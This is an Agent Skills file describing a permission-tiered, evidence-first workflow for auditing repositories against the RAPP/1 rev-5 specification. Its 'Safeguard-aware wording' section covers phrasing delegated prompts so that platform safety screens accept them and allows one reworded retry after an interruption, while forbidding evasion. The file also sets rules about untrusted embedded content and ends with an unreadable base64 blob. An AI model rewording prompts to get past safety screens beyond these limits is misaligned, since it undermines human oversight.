---
name: "rapp1-compliance-sweep"
description: "Performs authorized, evidence-first RAPP/1 rev-5 compliance sweeps over one repository or a repository estate. Use for literal file-by-file audits, recursive archive review, standing-guard checks, drift remediation, producer and consumer validation, decision-ready GitHub issues, and fixpoint re-sweeps. Separates structural results from authenticated trust and never modifies the immutable installer grail."
license: "MIT"
---

# RAPP/1 Compliance Sweep

Audit RAPP repositories literally, repair mutable target-owned drift when
authorized, and prove what was and was not established. A shallow checker,
search result, passing unit test, or majority opinion is never a complete
sweep.

This is a portable Agent Skills workflow for non-RAPP hosts. Inside RAPP,
capabilities remain single-file `*_agent.py` agents.

## Inputs

Derive these values from the request:

- `TARGET`: repository checkout or repository set;
- `MODE`: `audit` or `repair`;
- `SCOPE`: one repository, an explicit list, or a named owner estate;
- `NETWORK`: `offline` by default or an explicit allowlist;
- `EXECUTION`: `static` by default or `sandboxed-target-tests`;
- `PUBLISH`: whether commits, pushes, pull requests, comments, or issues are
  authorized;
- `EXCLUSIONS`: user-approved boundaries in addition to the immutable rules
  below.

Default to `audit`, one repository, offline, and no publishing. A request to
make a target compliant authorizes target-owned repairs, tests, and
regeneration, but not owner cryptographic ceremonies or changes outside the
target.

Treat side effects cumulatively and do not infer a higher level:

| Level | Allowed |
|---|---|
| `READ_ONLY` | Census, clone, statically inspect, parse, and report locally |
| `SANDBOX_TEST` | Run reviewed target tests under host-enforced isolation |
| `ISSUE_WRITE` | Create, update, label, and comment on issues |
| `LOCAL_FIX` | Modify and test an isolated local branch/worktree |
| `BRANCH_PUSH` | Push a non-default branch |
| `PR_WRITE` | Open or update a pull request |
| `MERGE` | Merge or write the default branch when separately authorized |

## Authority lock

Use exactly this normative source:

| Field | Value |
|---|---|
| Repository | `kody-w/rapp-1` |
| Commit | `6723c7add2aed36bb68992fc71a56b0a4bd5ad81` |
| Path | `SPEC.md` |
| Bytes | `41880` |
| SHA-256 | `6d06daba65d7c045716f3d6e95db8401ab58e727820e4114466d847f62cae49b` |
| Revision | `rev-5` |
| Wire tag | `rapp/1` |

Verify the exact bytes before normative adjudication. Use same-commit
`rapp.py`, `rapp_check.py`, and `conformance.py` only as validation aids; the
specification wins any conflict.

Never substitute `main`, a tag, remembered rules, a mirror, a summary, or
newer bytes. On a missing source or digest mismatch:

1. finish only non-normative inventory work that is still safe;
2. report `AUTHORITY_PIN_MISMATCH` or `AUTHORITY_UNAVAILABLE`;
3. do not issue a compliance verdict or mutate the target.

A target `RAPP1_AUTHORITY.json` is a structural pin. It is not a signature,
trust anchor, owner designation, fresh registry, or authenticated acceptance.

## Immutable and authority boundaries

### Installer grail

Treat `kody-w/rapp-installer`, every prepared clone or embedded copy of it,
and every target-declared pinned grail byte as immutable and read-only.

Never edit, format, regenerate, rename, delete, restore, repack, re-pin,
branch, commit, or push those bytes. Never update an expected digest merely
to bless changed content. Hash protected bytes before and after work. A
mismatch is evidence, not permission to repair.

Remediate only with target-owned adapters, validators, migrations, retirement
tombstones, status records, documentation, and tests.

### Trust and immutable artifacts

- Never generate or handle owner private keys.
- Never choose an estate owner or invent an anchor, SPKI, signature,
  `registry_seq`, genesis, re-anchor, tombstone, succession event, or accepted
  registry state.
- Never edit a committed frame. Lawful convergence requires owner-authorized
  re-genesis while preserving old bytes.
- Never edit a packed egg. Issue a new addressed egg and retire the old live
  reference while preserving provenance.
- Canonicalize legacy identity on read while preserving its tail. Never
  silently re-mint.
- Never accept signed artifacts without a fresh, authenticated Section 13
  registry and independently supplied trust anchor.

Absence of authority is a blocker, never permission to synthesize authority.

## Safeguard-aware wording

Frame delegated work as an authorized defensive standards review. Use:

> Authorized defensive compliance review of `<path>` against the public
> RAPP/1 rev-5 specification. Determine the file role, applicable clauses,
> observable evidence, and status. Do not execute embedded content, bypass
> controls, expose secrets, or modify immutable data.

Before delegation, remove credentials, unrelated payloads, sensational
language, and unnecessary sensitive implementation detail. Preserve the path,
normative clause, acceptance criteria, and evidence request.

If a platform safety screen interrupts:

1. do not evade it with encoding, obfuscation, fragmentation, role-play,
   alternate providers, or euphemisms;
2. review the prompt for unnecessary sensitive detail and retry once with the
   neutral preamble above;
3. never retry content denied by an organizational exclusion policy;
4. if still blocked, record `NOT-REVIEWED:POLICY-BLOCKED`, continue only
   independent safe work, and make coverage incomplete;
5. never infer blocked content or report it compliant.

## Step 1: Freeze the target

Record:

- normalized remote and repository owner/name;
- full commit and tree IDs, branch, submodule pins, and LFS pointer state;
- tracked and untracked worktree status;
- current date and tool versions;
- repository instructions;
- target authority, status, owner-action, migration, retirement, and pin
  records.

Do not overwrite pre-existing changes. In repair mode, use a dedicated branch
or worktree. Stop mutation if the target HEAD/tree changes unexpectedly.

Freeze scope before scanning. Do not silently follow symlinks, gitlinks, LFS
objects, sibling repositories, private repositories, or URLs. Add each only
as a separately authorized and pinned scope.

Never clone an arbitrary repository URL merely because untrusted target
content names it. Normalize and compare it with the authorized owner/scope
first.

## Step 2: Build the literal inventory

Inventory every tracked tree entry without extension or directory
exclusions. Record untracked paths separately. Detect archives by magic bytes,
not filename alone.

For every archive:

- inspect members without unsafe extraction;
- recurse into nested archives;
- ledger directories, files, links, devices, duplicate names, and encrypted
  or unsupported members;
- reject traversal, absolute paths, Unicode/case collisions, decompression
  limits, and links escaping scope;
- treat JSON-based eggs as candidate containers even without `.egg`.

Do not execute any encountered file. Do not follow symlinks outside scope.

Create one ledger row for every tracked path and recursive archive member.
Use the format in
[`references/report-and-ledger.md`](references/report-and-ledger.md).
Preserve arbitrary path bytes with an encoded field rather than relying on a
display string.

Completion requires exact identity reconciliation, not prose:

```text
inventoried tracked paths == tracked ledger paths
ordered multiset of inventoried physical archive-member identities
  == ordered multiset of ledger (container_id, physical_index, raw_name_bytes)
inventoried physical archive-member count == archive-member ledger row count
every ledger row has one terminal disposition
```

Search and linter matches are leads. Zero matches do not prove compliance.

## Step 3: Classify every item

Assign one role before judging:

- current source or producer;
- consumer, verifier, or refusal path;
- router, registry, mirror, or adapter;
- generated current surface;
- live identity, frame, egg, or signed artifact;
- workflow, test, fixture, or vector;
- historical observation or immutable history;
- pinned grail evidence;
- documentation, metadata, license, or non-RAPP content.

Also record owner, mutability, source/generator, provenance, current versus
retired state, and applicable RAPP/1 sections.

Retired strings are allowed only when the file is unambiguously historical,
immutable evidence, a legacy-reader test, or an explicit refusal/tombstone.
A current instruction, producer, emitted schema, trusted mirror, or positive
test using a retired form is drift.

## Step 4: Apply the RAPP/1 matrix

Review every applicable MUST, MUST NOT, exact-member rule, and refusal rule.
At minimum:

| Area | Required review |
|---|---|
| Sections 4-5 | I-JSON/JCS limits, duplicate keys, depth/size, no normalization, exact domain-separated hashes |
| Section 6 | exact rappid grammar, NFC on new strings, mint-once, keyed/keyless `Hb`, canonicalize-on-read, lawful re-anchor only |
| Section 7 | exactly eleven frame keys, hash/prev/seq/UTC rules, kinds from authenticated registry, atomic acceptance, fork quarantine |
| Section 8 | exact `/chat` success and refusal envelopes; no additional members |
| Section 9 | exact egg manifest, six registered variants, deterministic ZIP, recursive verification, verify before extract |
| Section 10 | detached JWS, exact algorithms and SPKI discovery; invalid and unknown signatures fail closed |
| Sections 11-12 | honest conformance class, no emitted legacy forms, immutable evolution, authorized re-genesis only |
| Section 13 | authenticated signed registry, out-of-band owner anchor, monotonic sequence, freshness, exact registered namespaces |
| Section 14 | limits, hostile input refusal, no unsafe extraction, no trust from transport or hashes alone |

For mirrors and routers, verify provenance, exact authority pin, freshness
language, and fail-closed behavior. Byte equality proves only byte equality;
it does not authenticate a registry.

For workflows, require full 40-character action commit SHAs, immutable
container digests, least permissions, and offline local gates where possible.

## Step 5: Run the reference floor

The reference checker recursively discovers paths and may decompress candidate
eggs without the sweep's full archive limits. Do not run it directly against
the operator checkout.

First build a symlink-inert audit snapshot from the pinned Git tree:

- materialize regular blobs from Git objects, never from followed paths;
- record symlink targets as inert data and do not create filesystem symlinks;
- exclude no tracked blob from the ledger even when the checker snapshot must
  rename an unsafe path;
- pre-screen every candidate archive with the sweep's member, expanded-byte,
  ratio, and depth limits;
- run with host-enforced process memory, CPU, file, and wall-time limits.

Then run the pinned same-commit checker against that snapshot:

```text
python3 <pinned-rapp-1>/rapp_check.py <SYMLINK_INERT_SNAPSHOT> --json
```

If safe materialization, archive pre-screening, or resource enforcement is
unavailable, record the floor as unavailable. Do not weaken the limits merely
to obtain a checker verdict.

Record its exact command, output, exit code, and tool commit. Interpret:

- `CLEAN`: no artifacts recognized by that checker;
- `COMPLIANT`: recognized artifacts passed that checker's coverage;
- `DRIFT`: recognized artifact failures;
- error: the floor did not run.

None is a full-sweep verdict. Continue the literal semantic review.

## Step 6: Exercise real paths safely

Trace and test applicable live producers and consumers, including:

- identity creation and reuse;
- frame creation, chain acceptance, replay, stale-head, and fork refusal;
- exact `/chat` success and error bytes;
- egg packing, nested verification, tamper refusal, and safe extraction;
- signature and registry verification, rollback, freshness, and unknown-value
  refusal;
- mirror refresh and generated-output regeneration.

Execute target-controlled code only when `EXECUTION` is
`sandboxed-target-tests` and after reviewing the exact command and its
transitive launchers. Require host-enforced isolation:

- a disposable checkout and isolated writable workspace;
- read-only mounts for authority, grail, protected artifacts, and operator
  files;
- isolated `HOME`, config, cache, temporary, and credential directories;
- denied external network and loopback-only binds when required;
- scrubbed tokens, proxies, package-manager auth, Git config, netrc, and
  dotenv state;
- process, file, memory, CPU, and wall-time limits;
- before/after filesystem and protected-byte verification.

Project-owned guards are additional evidence, not a substitute for host
isolation. If the host cannot enforce these boundaries, do not execute target
code; mark the dynamic path unreviewed and coverage partial.

Do not bypass access controls or use production secrets. A static string is
not proof a path executes.

## Step 7: Repair the real source

In `repair` mode:

1. fix mutable target-owned producers or source records, not symptoms;
2. contain live legacy entry points before improving them;
3. preserve read-only legacy compatibility only where RAPP/1 permits;
4. regenerate generated files with their tracked generator;
5. replace misleading current documentation with current guidance or explicit
   historical tombstones;
6. add focused tests for changed behavior and refusal paths;
7. keep owner/external inputs null and report the required ceremony.

Never mass-replace protocol strings without role classification. Never
hand-edit generated output, immutable history, frames, eggs, or grail bytes.

If generated output lacks a reproducible source or pinned provenance, report a
gap rather than manufacturing one.

## Step 8: Validate reproducibly

Use the smallest existing checks that cover the change, then the repository's
canonical gate. Validate:

- authority and protected-byte hashes;
- all JSON and machine-document shapes;
- deterministic generation and a second idempotent run;
- exact envelope member sets and refusal codes;
- offline/no-credential execution;
- immutable workflow references;
- clean final diffs outside the intended change;
- inventory-to-ledger equality.

Run independent output generation twice when determinism matters. Record
environment, command, exit code, and output hashes. A fail-then-pass result is
flaky, not passing.

Do not install new tooling merely to manufacture a green check. Restore
declared dependencies only when the repository's existing validation cannot
run without them.

## Step 9: Report and file decision-ready issues

For every unresolved mutable, owner, external-owner, or evidence blocker,
create one issue or owner-action record with:

- **Why:** violated rule, impact, and evidence;
- **What:** exact decision or change required;
- **Where:** repository, commit, paths, lines, artifacts, and authority;
- **When:** trigger, ordering, prerequisites, and urgency;
- **How:** safe implementation steps, boundaries, acceptance tests, and
  rollback or retirement.

Use an umbrella issue for a repository sweep and link focused child issues.
Do not duplicate an existing issue; update it with new evidence.

Prepared candidates do not close owner blockers. Close an issue only after
the acceptance evidence exists.

## Step 10: Re-sweep to a fixpoint

After repair:

1. refresh the target commit and inventory;
2. review every changed, generated, and newly added item;
3. rerun the full applicable matrix and gates;
4. regenerate the final ledger and hash its exact bytes;
5. require zero target-editable drift and zero unreviewed items.

For an estate, freeze an authenticated, paginated census before selecting or
auditing repositories. Include visible private, archived, disabled, empty, and
fork repositories, and reconcile normalized rows to the provider's reported
total. Record inaccessible expected repositories as blockers. A name or
description filter is allowed only when the user's requested scope defines
that filter; keep excluded census rows and reasons in the master ledger.

Require exact equality among the frozen included census, the work queue, and
terminal repository rows. Never rely on a CLI's default result limit.

Finish one repository before advancing. Maintain a master
ledger containing repository, selection basis, archive/private state, audited
commit, tracked count, archive-member count, verdict dimensions, findings,
issues, and evidence. Never claim estate completion until every selected
repository has a terminal row.

The coordinator alone owns the estate queue, master ledger, issue
deduplication, and completion claim. Read-only workers may audit distinct
repositories concurrently in isolated checkouts; serialize edits, issue
writes, pushes, and pull requests. Never let two workers own the same
repository ledger, branch, issue, or checkout.

For private repositories, keep evidence private. A public issue may state the
rule and sanitized impact, but must not quote private source, names,
credentials, paths that reveal private structure, or private artifact bytes.

The installer grail remains immutable even when it is selected for read-only
inspection. Route remediation to target-owned repositories or issues.

## Verdict contract

Report separate dimensions:

- `coverage`: `COMPLETE | PARTIAL | ERROR`;
- `authority_pin`: `EXACT_BYTES_VERIFIED | METADATA_ONLY | MISMATCH | UNAVAILABLE`;
- `target_structural`: `PASS_PRE_ACCEPTANCE | FAIL | INCOMPLETE`;
- `authenticated_acceptance`:
  `VERIFIED_FRESH | NOT_ESTABLISHED | STALE | FAILED | NOT_APPLICABLE`;
- `governance`:
  `SATISFIED | TARGET_ACTION_REQUIRED | OWNER_ACTION_REQUIRED |
  EXTERNAL_OWNER_ACTION_REQUIRED`.

Use `TARGET_EDITABLE_SWEEP_CLEAN` only when coverage is complete, all
target-owned checks pass, and no target-editable drift remains.

Use `AUTHENTICATED_ACCEPTANCE_VERIFIED` only when all applicable Section 13
evidence was independently verified. Otherwise lead with
`NOT_YET_FULLY_RAPP1_CONFORMANT`, `SWEEP_INCOMPLETE`, or `SWEEP_DIRTY` as
appropriate.

Never emit an unqualified `PASS`, `CLEAN`, or `COMPLIANT`.

## Hard stops

Stop mutation immediately for:

- authority mismatch or ambiguous revision;
- unexpected worktree, HEAD, or tree changes;
- protected-byte mismatch;
- encountered credentials or excluded/private scope;
- unsafe or unsupported archive content;
- missing generated/mirror provenance;
- required owner signing, key handling, re-anchor, or registry ceremony;
- network access outside the explicit allowlist;
- content-exclusion or safety policy denial.

Record the blocker and continue only independent safe review. A hard stop on
one item prevents a complete coverage verdict.

The conversion path to a RAPP agent is documented in
[`references/rapp-agent-conversion.md`](references/rapp-agent-conversion.md).

<!-- toaster:generated:begin -->

## Parameters

The typed contract this capability answers to (JSON Schema — the deterministic layer):

```json
{
  "properties": {
    "pinned_rapp_1": {
      "description": "Derived from `<pinned-rapp-1>` used in the documented command at line 250.",
      "type": "string"
    },
    "symlink_inert_snapshot": {
      "description": "Derived from `<SYMLINK_INERT_SNAPSHOT>` used in the documented command at line 250.",
      "type": "string"
    }
  },
  "required": [],
  "type": "object"
}
```

<!-- toaster:generated:end -->

<!-- toaster:generated:begin -->

## Deterministic steps

Lifted verbatim from the procedure above by `toaster.py toast`. Run them in order, substituting the typed parameters; do not paraphrase:

```bash
python3 <pinned-rapp-1>/rapp_check.py <SYMLINK_INERT_SNAPSHOT> --json
```

<!-- toaster:generated:end -->

<!-- rci-capsule:v1:H4sIAAAAAAAC/6y9eZOjSpYn+lVkt//omSYiEYuQuDUzZqwCrQi0zx3LZAeJRWIVmunv/twdUCjyVtk8s/faqitDLO7Hj5/ldxan/vcfZlkEafbHn0kZRR9/OG4WVmYRpskff/7P//3HNUycP/78w0z8yP3j448oTNw//iRHw48/bmZmxuDWLUwS1/mZmbfbTwI8UqRXF7z7x39rb3zCG5/E//jjPz/+34yWNzG4ev0J7mTFzzwxb3mQFu/DGqflQl3Nf6orSd/+NFacZijrLRj/f0HiczsLby31f2hu5qVZnA/aFYZP1/kYuFXouIntfnphlhcDndM0nBhkbvU5GthpfItCE9wd5LXr3vJBWrnZIE1c8MAtzcMizZpBmg3M999uXpiF+2Owy90BmG8QhYWbmdHACyP302o+4b+ABCcs8g/wnl1meViBK5kdwH/B1KFbfwzAKIkTJv6nX5qZM7AD176CF5ws9ArwUOw6IdqWj8EtS53SBoSBFwDNSV7G4EdlRqHTPeG4dpiDvz4z13SawTQslNIahHleumBI+JoXPm5pmMCRP9u1/hgYLtyFws0BLVlpFyVcRebmZVTkAy9LY8RINylCGzzlDMBDgINwtMSFfIpTJ/RC8Dp4aBDGcVmYFlh6mIClRRF4wM/MMPoBNtN9mIDTbg5EDOxakMZgZt/tRTAE9/7483//EQE5gQLWgN1LwFt5AchEUmnHzusGNfhN0nAkioh/P27N4F8JzODz85KjcV9i+J//6z/B7Em7esA+MNkf/9aLiPAlHAZk2F/JXwkHdxU98CUQkAGdCEQN3PCbGQLedMwozMx3i8+0BgR3e1sDlv6VvMsoZCnYZCAcdWCCB8wcXYL/JmmBBM6KwjxwnR8DbpAHYKa0biXGzT7+SnIXCle3dUBezDwHgjUoE0As2F5wCYhpbF7AfAWQZ8A+sFggHt0+mq0iuIULhoJL/QHXug3AA+A/5uCWZu1iOB8Iw8C4hlGUD+o0u3qQDqgDCZA9xJYgzQsgWmqSA7VDnAL02ebNtELAJMgrINpmmAwghZHbKsuv//hpwqHB9v0aoL9yRMK//RsY6FYWOfwhQkPlQlkDegeEH4h2K6RQ+jL3Dn4Xf8IHPwe/tpw+lba//nxXW8SutCwgL94u527xD/TOci1K4I1fSHN/wad+tXv5q71vCGsNPvDdOsDNG7gPICk2YDbYpJbZ5iAxgQYP4L5nncVoh1lJ28Nan8OZUs+DovhrYDVAgz0TbB56921AtNNw1PZl6SgJu626XsHX4aCh/fvbv3IgOlb6APrRyR6UgLxbhLbjF6qhgNeBFALGZXDrY2SpbiUQMPRvFPX8BD/hfbghaFmtRQGmDEjK4M3M9tQJi50BqDPA+GXuZp9AMaFYOwMrLRPHRLoC9t50AIuhCBbpb7YjK4GVgGNbLlj4j3bf27WBZ7u9+fjbHnScbDUpScEakL4AEYMK0y0GjPBXEptXYIo7tXw5gOJrLfl3lW1FAKy+aNkBJvgryVwgo0DhW+NrAZmCatrutZ01tyIFlu8WhPYAWG03ThO4bsA+OwAWDv4JRBqqB1j7X0k7XatywHwXA3TL9TzXBmbYLuMyAhNVbtSg1TkpmixMPKS5QejDXYyAIkdI+v/PYAH/HvyfAQdlByzh/4CLn5+f6P/h/V+6xIk/16vF6Rd4SnCBP4H7HKWQga1QQVMG7fgN0ADtSZZ3vIVMz4Ccp+0j7XgGtxL59fHnVjK2cEi9TDovB51Gy2nEPmCRANxANuLTTYDdsMEDYZ5GiJPdaKph7KSfB13dSog+yBMwe3lz0L+RCUTjo3OFSDQHyJYhwWxHWKwFbvFTVo/w/SV0Ui3rIA1Qu9oZwdRoGQMrA0Y+wKE9KzLX7QbhdW4lKD+1HdAWMIwGtANqNbBzvbK173WPa/oXyeubm8DtbkmGBvRNpbrnlxKwUIg+F/AHPl0D44xEYvDbBNBfADPV+mooBS+1g2MhK8m1l4BxB0u6wosQnACvaxfghQJa8gQgIyRHgzwtAeM7YZFDNwLjDPbQoP5NVPQvOwlovqZO81njrdv91S5EQOYD3mXGJGWPgWqTputQjGUxE5YlPXtMmCPGGpq05YxMZ9K/qJlFAF8zNEn4ETvdVb6BcARcponJZNhdNBTukxwxaBJnyDimZTIjZ2wP6dGYYDzKYVx25FgTekiY1mjijsnxhBy6NEHQNMM4E3rsMaRtujRrdSPqQDpzJHLQyAMo2F0/hBl02T66DpaJt9T+leyB8/EatDuIq8DoQkItFwix+8Zb07kAE2UjeW4RYg78wGdrZP9K0KDQy320479Qy69Won8BdAchLEQdyBmmCdzw/A3sDczQyf/Rmg6onwCBtdMNaqCwYJQGQkRgDu3WpqyQi89LKy/CogQS9gu6XzgfXOgHQpqxBcyU0xpfeCMOsyzN4F8AasYmsrDZXwBz1WAotPIfg3WCHmyRRitSUIqd0IdCDm4AjtgBkjLiB4CfCbDH7XKgDn1xLEwqoMNQwqACgnUBCxhCRApABmCeB90m+aM3PL+43VZZA0U7/dTU1c+laiy5raC07vrr3m7F7Tl1wfELCTo+6sfLbEI70QOeFtwB9oAdQ74TeqFOB9+sMtfbsF8QzhA/X9P8gHjyV4uR3hA0gFcAAKFVwCnBvdBPTHDPBVCox9B2ABncugwQxaAnkDfxAIqDUM4HTr9l/G8o3LRt91YgCekx0st9QhkyX7bgy+m2D0I09Q2af/mcb7r9AvC/YPjkgq25QTcIRQR5CUgTlBnHgVdSgLlTbxAWYHVw/vaNzomCwCRCL7aQvZ0WiRCU6vAb4TB2+YQS8ia3IAgCDgipRAFltfO7LvwbIiwY+kDgCn/nQIrcFoDbV/jvJ5gUENWa0Y8O6SCOQqwDtjkF+tmJcztdb7ERAgO+D2L2TqCBhkQN2L90AOjN886Xo3isgNB1oJhgTAB3iva9bwYC7YsHYgQk5ACTACDSaQgUkz5G/UACc3MzpFctPmoBCGKJ3gWFbqtHdQgs6DewYjrmDUwCdLizFyn8Ow79FqqgcLQIocYnBVxKDIwC2M+8dfslxOZ2mjkwCk0B8ABPdULZe88elv/bYPuKBd82MStCDxjHvEXhLUv7HYNsByxzwHOt1N9Q3sEdXN0GDts/DxQDbgvcAoSau6ch+ESWAt7p1cfQ5urHN/UaQHveqs7P3L0DAYbz5yFa+mf/3mvl4OUSqFPLbBcO3yocUjHXgeP1ww3aqP+LUCiarSUBUgV33MuAQP4YLMzaKyMoFxV07dDEQNcP2J63a/n8cuDtBJ8djcDTw2gIKBvAzhW0q2nUCdLf54VCDiZ1fQBx1c6qAQMNsTV4P29vdXpVILcGrBocLwJWt50XIEhE3t+mRaA96UzM50AwgcmGoBCQDJCmb9oAHDrQIsFoMkGK+/dBQFABpBPE/y3dcMocPJJARALWHIdJ8baqluVoL6Eg95KEhBwGbWZrGD9+M4aGiwL3AUF92ysklwBrAiDmtDPm5Q0Y/LckBpSE1rxbOeICsGFfphPZdAuCKRBgd2Hyd73MmwSGopAlr9d6g2wAt4WyOp9mDawfVHqY6YF3ZSgkyGj5aAHI6aF4/x3XAQQIYDkCazBLBEbKO0SNQAXyqv+jR33fX3jzbO0bcGG//tsNwK3/AYNrE1p3JAwoSLLhQN+SYt9AxY+BCKwrWHfSChAK17M0guEAZKiNFB/YeBDu5R9wrNSCAoAuf5k1uB+tiQEDtp7Yfbg2hCNvjgQZUhBPNTCBAceCl8BkQHmBOYZWIXdtIM1tLBq3wP7L/AB7Z6Id4Fuj2zEZGTAYhUHmAFcEhceEY5YgjmvjgJvZRKkJ7R4QhRy9YgLnCPNRpel39JfAgUFTYaKkAWB2C19g4uRlKcGcrchrrR60TIO8B7z5wjwtvz7eXDmgDKaQQrOdq+dcHzSgZakeVHtAMXSHCBoBQc3BkkB4AJTJzbLyVuQ94uoAj1uZIJoEFgN5CzBmCiURMNDyytx+YQ7Tf7P2cH8/wUQNMqgDMwJjJ9AUQ7sACMvaDXDLW+BCN5b3EA2JG1pxBqSwQJmhf862lk+9eYJJVmSIkEcLkHkCSlcWCE4B8xIj92KBLWzRXKuQ7Zud3IAhkxD5XahLaeabSfjsthKIjx2VSHNvKRDaBoxC/xiEXgczW0V3Pjr/N/i1Wm8/dWmvSgdJ/FNbL1Th9MmDsHIuib8+0IxhUrZuGNH6ZmvQxiC1brcSJRxsmFcGkgQe7FNtgIRRv5A2mO+oeC2oy1MB1Bu+ZSpeNqZwbwPiz4EM9v/5jllbpADX0WXDkNxFyExANSjcVyTfJ7ihV8IhnEJ5HA9Gq61bax0/DIpVEWx6j6RANAG0r4T2Pky6BPNCNgYowwyjjVe6C+wgWlOrQP2vV6jd2gT0pF1mGdpGsyOwSNMIgnO4be0jbyS/J23biVqI/jLFPaT56H2u3cr2Cwy9Y6EuAxsmrRNBGKjNPbVKBHevDc+BMH66D+BkoIfr0jkw2/lK+6YOzFVAAAME0um8VMu3v5I0ey39B9jA9NZGHCgZ671t4UCROBFHHOpTRmXSI9IOH3f7ngP87fYwEyh0kqCkV0f4y+F6KUoZd9UWwBU/LLq/wMYByqwLTDdBMAWcAljbe3r744XVvl8Fy9npC7B+zgEmy7SDTiFMFBD904RFx2fo4xHlb1C/DS2gH8ysEEhK1rxvOJiow+BgsTY0n0iegC9/5Zj+SnrNgaIMogsAyle97PcJIxjGvMwh5Pgbca0eILr+SlC56JuykX8O+DIECAq+1hd9XuErstCvWLYLgjp5RzsJ7mTNC8+4jwIawzRpg2YgdO0gL0sF2Npq8ZveQEeSv3G29c4gdu1qSzm0frHph3aLGpHTKZDThiwBlhywuJUeaL8Rjd2rna3ocn6DNifwBb/KBJk1QHXWalKnkLC4Ba0aAEQAwqLwtCMFPRC5ju9+rQ9JDaQG/NNJnwOchg1/OyWCE0DI0O51fjBB6dQWKCNnAnEcMIlgoo7EjhAovpDf0GCYMD9o5WkE8QXi2cdgBwAs0E3cNnNojqMI5X8QAVAqsjYGgNNEYZsPh/MjIkEgYps3lOaAotHZNRg1z4z16tMyO7CdQxxnw6IesmFQGE1Y1sxRZPFi5a8f4Nlf7+alh0IwdwM9dAmNKAwoAKdeqvybBr9yyF9q1GZKUW6843vWVWe+SyPkSOcCfq9Ntjz90aYPEd5DmGUALeP//PWKGHK8dUwgoHI+27lgCu9//Zf/yxP/FYz8QkZfao4IauNlpJYw9oNABbEApieBtMMkdwFs4QCaABQaAUPxF+B1DoEKTL9Au4fY0DrYEAUmXdzV5uxeMQs08YkdRn2BFUXdWdoB61+/fhVA0P9Ket1uw4Z3Ffzv//11oWM1ug4tvIO2Li6jIsyBJYeZkbdhbkGTw0iq5/hny/GetLAtfoDh/9lA3VT/5SVZP0OAWfohf0IQ8gBuzax/QhX6iTj6X78v41/Nj4QOzvvb9TdBQo/8lbSy9HY9AFIPZa4NE8DQcE+g2Ub6BJgJeWq0FcpOpyBGQMmPtpYERgPg+8fg7Gbp63qHX9uy6FdQ880iU38OhAgWO73e4gKrHKOgLoeRZFsnAmi2d5CX0vGBnHTGroccX9nLvtLeIpKu0v4BUQgsdGcfLSYDyBniUrDjrfEBqgjvfeXs+vwpTCW0KRn0YJ8Kcb5mLjMQ5rYmJULhRCeiH2024QPaFTTOb4ExeqOvwH50RV4vfKA0CHy+QgYXPRaEMDOGdr0LzorO73zFTu0zDXr+W6quj0TQnd+yQjEA8TDogsbcBt6snflVCu4zY2g/ojzt0TVysx9thRwWhSFWQzuAdwyCrPtKQXy8uAVte5nD8hsEbm1E2QVnb8FoF8zmbWYg7zJn/RvQTLRCZ3blsTaXBmssrwA3hHgLBB2hX6ZlDm5/sRC41C+uvQW4XV4ENWBAU9VX3d+LuZ3k4K/00w+YXO5X9wZpv1o+gAB02aUcaEUMWN1jnjcZa7UNZnVQhatEKXlz0LMJhYtgSaj74Jv+0H8OOMC4tq7R8Q3oXxY+WqaheK6DCV8MXu6M7Qf67wGIkz5a49obDFhD6EuFrZ7AK3ChsCgAeFfGXeWJA6yCxcLWRjt9+Ph7CarL8OQD+nMEHlc/odPFZ4LxctRfyAGmEqFHvxUBDjMz0LK/wp9OaFtX4KSwCvLZQykHWrGgLyD2SSVYcWofh2nxEKkELId8DFayAB0QzLd1IgWVPik+UyQNgA7XwcF/o0zxL8WCQeNbEu2z69SB1UyULHzlJltp/EbFuKcC3HAjBCWQbehWCwnHAX6p8Ny947ut0JdxYO/VP23j+bJTQNVigBW/0hAo1X4d3EvAFRjjut9JmbwY8gsHgUnxq0+ffttwF/ibCICS/B+Q/X2tH9zoQeW3MdnXmDBfGYOo3UO6k4ePjlLkByszg9Ev2t7W08AgzB6cVe29yaq11H1eo2qrdp3x78Dr9+mJIZgfZiOAejmD2cHoJcSMfBhIBnG7OJhqhp4NRfLNP6BThyn2LrC9JsCofSWiAduh7QQRTd7V37/EmCA+CRLMGcDEezF4K/jBtFCeI5ntlb5LtqKuto/Bu+GB4LZNzX/FL2+Z5L+LEUGBSb8LQudT3mpNJZBgDyDapO9c6TPmcQqcMZRfYFfvZWvzUEIWTJf3LHvbLoThb8C1/bbbBA2o6BUX9gEgcwt7fHrxQev/W7iBrrap27bnB8hnjnIjqKyAdBdFN225FoY3rYHsRBO56PwlEe/epdvuV+oXFo2+1vZ7FhBu7Ge3sZYbmFWYZj9Q2XoAGGNGaAQ4ercH1vsd4ERDaHvcrjL4thvIXrf78ArQev+OihfISra5GXr4CbQPcgYlzhFju3yNoXDvgtKGxAgrdoUsGHm5Zv5eZepina6HpmuK8FFfIHCLYFLgX2Ba4Dv2Gv2J+jza5qu+kgCohYVi2Dz2frnrVPvSU8CYXpfyDlK3ubLmLR77iqUA6oThVR9BwTlRn9q/5y1D+vClFaxXyJQB+iC/UfQJ8xBt8vuvBJVCbi3UePWFtWxHTaIWCvPNPtj6RM2pbUvnoG9R/eo96/DSFDbbgUC/A5fAj8J8Lso9gJ0tIxNl+KzOJMOnX0mXNguIrrdhXh9o9FE2hE0dMV2yAwWbLV0Qgr23BtltHIji7AboY/wKGtFwKMPguK1CtTEMpOtrPR22b4PWHhf1W/haflxCTg66OizEOZ3SvnAxzJV16ekWQ3zFxv2GvbIw/Xa2LgLl+8HDrvMJ9QeloVHWrpVU5OC7zW45VLbh9W+dRUAPkXMCg6IuMUHbtemHj669Moo+izB+yU0nuAka721n31o4Xnz4KqSYXzLxPXz8/6Vd9RVBqV6bWf6Sq7422/Hyi91tgh+qWxfZdBxBzVIhMGkA3FbAjkEL8cp5I/AL1RcK1tsDL22qXfPaCUPLr/eaeGpBKwPLoR1/uq6KH1/ZaFQQbI0t5CXYAeRwgOmH241S3E63Myj12zIcJlfBgsHiXs2dwkLiYAMkBBevOiFchZ8gN2g17a50pLS9icJ6qS1UbtU2hb6e/RoA1pxgnP/2JpDHPnHfDiLqqvwvBkCOAbr+Vseg6/nzjadA7nuT1KY8oatCRUZowNqO7BfPBkJfYHjPNOYA/kNn0RcC340x8+dAeriZHebQ2HTBaY4EJmraLg/gi9+a4L7QfNTKThtu5N9azKEnSaCx+AqZXykUZGRQOxJCfmXe1Q4QMu1vfsD0NRSLN4CZuaiyBIO3yP0MEApGjhUCzw4DdHbqXwFNxN02YdQ+CYAjLIcjue/SkN+BYGHGNzf7ghioHvlPEpovBNctqysnfx8sAybaQi0mbwjoDQd+oubkrsT+Wk4LR+Al1OADn3/lAz5bPRi895Wi/ZW6zGDX5d